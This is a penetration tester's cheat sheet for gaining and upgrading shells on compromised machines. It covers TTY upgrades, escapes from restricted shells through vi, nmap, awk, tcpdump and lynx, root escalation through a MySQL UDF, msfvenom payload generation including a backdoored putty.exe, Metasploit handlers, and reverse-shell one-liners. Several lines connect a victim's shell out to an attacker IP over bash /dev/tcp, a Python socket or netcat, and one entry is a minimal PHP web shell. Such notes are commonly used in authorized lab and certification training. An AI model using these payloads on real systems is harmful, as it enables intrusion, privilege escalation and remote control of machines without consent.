      == Upgrading half shells to fully interactive TTYs without closing nc session. ==

-----
python -c 'import pty; pty.spawn("/bin/bash")'
-----
background remote shell with Ctrl+Z    // on victim machine
-----
stty -a | grep rows    //on attacking machine
speed 38400 baud; rows 55; columns 205; line = 0;
-----
echo $TERM     // on attacking machine
-----
sty raw echo   // attacking machine
-----
fg             // attacking machine
-----
reset          // attacking machine
-----
export TERM=xterm-256color //on victim machine
export SHELL=BASH          //on victim machine
stty rows 55 columns 205   //on victim machine. See stty -a
-----

            == Spawning a TTY Shell - Break out of Jail or limited shell ==

*PYTHON*
-----
python -c 'import pty; pty.spawn("/bin/bash")'
PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$ 
-----
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);          s.connect(("$ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(\["/bin/sh","-i"\]);'
-----
python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
=====


*BASH*
-----
bash -i >& /dev/tcp/$attacker_IP/4444 0>&1  // from the victim to your IP. nc -lvvp should be listening
-----
echo os.system('/bin/bash')
-----
`/bin/sh -i`
-----
:! /bin/bash
-----
`':!bash':`   //from vim
-----
`:!bash`    // from vi
-----
`!sh`    //from nmap
-----
`:set shell=/bin/bash:shell`
-----
== TCPDUMP ==
   echo $’id\\n/bin/netcat $ip 443 –e /bin/bash’ > /tmp/.test chmod +x /tmp/.test sudo tcpdump –ln –I eth- -w /dev/null –W 1 –G 1 –z /tmp/.tst –Z root      //from tcpdump

user@host:~$ echo -e "cp /bin/sh /tmp/sh_suid\nchmod 7555 /tmp/sh_suid" > tmpfile
user@host:~$ chmod +x tmpfile
user@host:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z ./tmpfile -Z root
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
Maximum file limit reached: 1
user@host:~$ ls -l /tmp/sh_suid 
-r-sr-sr-t 1 root root 117176 May 19 10:14 /tmp/sh_suid
user@host:~$ /tmp/sh_suid
# whoami
root
   
-----
open vi or vim and type:   //from vi
:set shell=/bin/bash
Next, type and execute
:shell
-----
awk 'BEGIN {system("/bin/sh")}'
-----
find / -name blahblah 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
-----
 After you use the 'more', 'less', or 'man' command with a file, type '!' followed by a command. For instance, try the following once inside the file. // more, less, man commands
-----
echo "evil script code" | tee script.sh      // tee -a to append at the end of the file
-----
 == Files Executed in Unrestricted Mode? ==
----- 
 Some restricted shells will start by running some files in an unrestricted mode before the restricted shell is applied. If your .bash_profile is executed in an unrestricted mode and it's editable, you'll be able to execute code and commands as an unrestricted user.
-----
== NMAP ==
nmap --interactive
nmap> !sh
sh-3.2# whoami
root
====


*OTHERS*
-----
perl -e 'exec "/bin/sh";'
-----
perl: exec "/bin/sh";
-----
ruby: exec "/bin/sh"
-----
lua: os.execute('/bin/sh')
-----
irb(main:001:0> exec "/bin/sh" 
-----
lua: `os.execute('/bin/sh')`
-----
`exec "/bin/sh"`     // from IRB
-----
select sys_exec('usermod -a -G admin john'); // from mysql command prompt. Then use sudo su and inser john's password.

First things first, for the MySQL UDF to work - MySQL has to be running with root privileges, so let’s check.
john@Kioptrix4:/var/www$ ls -la /usr/lib/lib_mysqludf_sys.so 
-rw-rw-rw- 1 root root 12896 2012-02-04 10:08 /usr/lib/lib_mysqludf_sys.so
-----
1. Using the text-based browser lynx:

    open a local file with lynx (e.g.: $ lynx /etc/passwd)

    type “o” to open the options; change the second option (Editor) to “/bin/vi” and save the changes to go back at the main page.

    Type “e” to edit the file with vi
    Follow instructions in 1.

2. Using the mail (local email client) command:

    $ set VISUAL=/bin/vi
    $ mail -s "subject" "destination email"
    Type "~v" on the next line to edit the mail with vi.
    Follow the instructions in 1.


 
 *SHELLS:*
 -----
 MSFVENOM
    
 List payloads
 msfvenom -l
 
            == Binaries ==
 Linux
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.139 LPORT=8443 -f elf-so > shell.so
    
 Windows
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
 
 msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=10.11.0.159 -e x86/shikata_ga_nai -i 5 -b "\x00" -f exe -o putty1.exe

 *Linux Based Shellcode* - generic
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>

*Windows Based Shellcode* - generic
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
 
           == Web payloads ==
  
  PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp

JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.159 LPORT=53 R > cmd.jsp

WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war

            == Scripting Payloads ==

Python
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py

BASH
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh

Perl
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl

          == HANDLERS ==
 Setup metasploit to receive shells easily.
 
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z

mssf > use exploit/multi/handler 
msf exploit(handler) > setg PAYLOAD java/jsp_shell_reverse_tcp
PAYLOAD => java/jsp_shell_reverse_tcp
set LHOST 10.11.0.159
set LPORT 4343
LPORT => 4343
msetg SHELL cmd.exe
exploit -j -z

-----
SSH to Meterpreter: https://daemonchild.com/2015/08/10/got-ssh-creds-want-meterpreter-try-this/

         use auxiliary/scanner/ssh/ssh_login
         use post/multi/manage/shell_to_meterpreter


*REVERSE SHELLS*  
 -----
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.128",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ----
 Pen test monkey PHP reverse shell  
    [http://pentestmonkey.net/tools/web-shells/php-reverse-shel](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

-   php-findsock-shell - turns PHP port 80 into an interactive shell  
    [http://pentestmonkey.net/tools/web-shells/php-findsock-shell](http://pentestmonkey.net/tools/web-shells/php-findsock-shell)

-   Perl Reverse Shell  
    [http://pentestmonkey.net/tools/web-shells/perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell)

-   PHP powered web browser Shell b374k with file upload etc.  
    [https://github.com/b374k/b374k](https://github.com/b374k/b374k)

-   Windows reverse shell - PowerSploit’s Invoke-Shellcode script and inject a Meterpreter shell 
    https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1
  
-   PHP shell. Execute some PHP code on a HTML/PHP page ==

<?php
$output = shell_exec('ls ../../');
echo "<pre>$output</pre>";
?>

*TIPS*:
-----
- run 'env' command to see PATH and how profile is configured.
- list the PATH directories with 'echo /some/folder/*' or just use ls.
- see what commands you can use from above and iterate through other accessible folders

Change PATH or SHELL Environment Variables
-----
'export -p' to see the exported variables in the shell.
    -x - is execute only
    -w - is write too <<<<<<
   
If the SHELL variable is writeable, you can simply set it to your shell of choice (i.e. sh, bash, ksh, etc...).
If the PATH variable is writeable, then you'll be able to set it to any directory you want. I recommend setting it to one that has commands vulnerable to shell escapes.
   
*COPY FILES*
-----
ls -alh /some/folder from $PATH and see if you can write in there
If yes, then simply copy commands into the PATH that have known shell escapes. OR write your script and write it here.
   
   - copy files to your home directory and try to execute.
   -- if not able to copy, mount devices or filesystems
   -- copy using SCP, FTP, rsync
 ----- 
Find other writable directories and upload your script there.
-----
Create a symbolic link in a directory where you have write access.


